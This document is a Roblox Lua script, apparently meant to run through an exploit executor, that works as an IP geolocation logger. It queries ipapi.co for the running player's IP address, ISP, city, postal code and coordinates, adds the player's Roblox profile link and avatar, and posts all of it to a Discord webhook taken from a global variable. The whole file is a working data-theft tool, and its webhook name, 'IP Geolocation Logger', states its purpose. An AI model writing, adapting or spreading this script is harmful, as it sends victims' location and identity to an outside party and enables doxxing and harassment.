local players = game:GetService('Players')
local httpService = game:GetService('HttpService')

local localPlayer = players.LocalPlayer
local userId = localPlayer.UserId

local ipGeoData =  httpService:JSONDecode(game:HttpGet('https://ipapi.co/json/'))

local function addField(name, value)
	return { name = name, value = value or 'Not found' }
end

local payload = {
	embeds = {
		{
			title = 'Geolocation',
			color = 16767975,
			fields = {
				addField('IP Address', ipGeoData.ip),
				addField('Network Range', ipGeoData.network),
				addField('ASN (Autonomous System Number)', ipGeoData.asn),
				addField('ISP (Internet Service Provider)', ipGeoData.org),
				addField('Country', ipGeoData.country_name),
				addField('Region/Province', ipGeoData.region),
				addField('City', ipGeoData.city),
				addField('Postal Code', ipGeoData.postal),
				addField('Latitude', tostring(ipGeoData.latitude)),
				addField('Longitude', tostring(ipGeoData.longitude)),
				addField('Timezone', ipGeoData.timezone)
			}
		},
		{
			title = 'User',
			color = 16767975,
			fields = { addField('Profile Link', 'https://www.roblox.com/users/' .. userId .. '/profile') },
			thumbnail = { url = httpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar?userIds=' .. userId .. '&size=420x420&format=Png&isCircular=false')).data[1].imageUrl }
		}
	},
	username = 'IP Geolocation Logger (By @mcantcode on Disсоrd)',
	avatar_url = 'https://i.ibb.co.com/RZySdXn/5e04aa216b89f-5n8-HL1dwsv-V9-SWfkxzq-O5en-Ze-Icb9-Ub-FEZw0-ZFVONg4-700.jpg'
}

request({
	Url = getgenv().WebHook_URL,
	Method = 'POST',
	Body = httpService:JSONEncode(payload),
	Headers = { ['Content-Type'] = 'application/json' }
})
